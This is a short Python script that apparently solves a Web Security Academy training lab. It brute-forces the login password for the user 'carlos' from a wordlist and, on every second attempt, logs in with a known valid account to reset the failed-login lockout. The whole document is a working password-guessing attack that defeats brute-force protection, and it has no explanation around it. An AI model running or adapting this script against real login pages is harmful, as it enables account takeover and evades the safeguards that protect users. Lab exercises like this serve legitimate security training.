import requests
import sys

def check_password(url, username, password):

    data = f"username={username}&password={password}"
    response = requests.post(url, data=data)

    c = response.content.decode()
    assert "You have made too many incorrect login attempts" not in c

    return 'Incorrect password' not in c


def main():

    login_url = 'https://ac6e1f7b1fac21f8c00c3f71005c00ba.web-security-academy.net/login'

    pass_file = 'passwords.txt'
    passwords = [x.strip() for x in open(pass_file).readlines()]

    user = "carlos"

    for index, password in enumerate(passwords):

        if index % 2 == 0:
            check_password(login_url, 'wiener', 'peter')

        # print(f"[+] Trying credentials: {user}:{password}")
        if check_password(login_url, user, password):

            print(f"[+] Found password for user '{user}': '{password}'")
            sys.exit(0)


if __name__ == '__main__':
    main()
